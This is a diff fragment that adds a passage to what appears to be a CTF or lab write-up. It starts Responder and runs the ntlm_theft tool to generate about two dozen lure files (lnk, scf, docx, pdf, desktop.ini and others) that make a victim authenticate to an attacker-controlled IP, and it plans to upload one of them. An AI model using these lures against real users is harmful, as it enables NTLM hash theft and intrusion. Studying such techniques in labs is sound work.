@@ -706,5 +706,39 @@ sudo responder -I tun0
 
 First ill start responder
 
+https://github.com/Greenwolf/ntlm_theft
+
+```python
+python3 ntlm_theft.py -g all -s 10.10.14.61 -f meeting  
+Created: meeting/meeting.scf (BROWSE TO FOLDER)
+Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
+Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
+Created: meeting/meeting.lnk (BROWSE TO FOLDER)
+Created: meeting/meeting.rtf (OPEN)
+Created: meeting/meeting-(stylesheet).xml (OPEN)
+Created: meeting/meeting-(fulldocx).xml (OPEN)
+Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(includepicture).docx (OPEN)
+Created: meeting/meeting-(remotetemplate).docx (OPEN)
+Created: meeting/meeting-(frameset).docx (OPEN)
+Created: meeting/meeting-(externalcell).xlsx (OPEN)
+Created: meeting/meeting.wax (OPEN)
+Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: meeting/meeting.asx (OPEN)
+Created: meeting/meeting.jnlp (OPEN)
+Created: meeting/meeting.application (DOWNLOAD AND OPEN)
+Created: meeting/meeting.pdf (OPEN AND ALLOW)
+Created: meeting/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
+Created: meeting/Autorun.inf (BROWSE TO FOLDER)
+Created: meeting/desktop.ini (BROWSE TO FOLDER)
+Created: meeting/meeting.theme (THEME TO INSTALL)
+Created: meeting/meeting.bat (BROWSE TO FOLDER)
+Generation Complete.
 ```
-```
+
+Then ill generate the file
+
+Then i can upload it
+
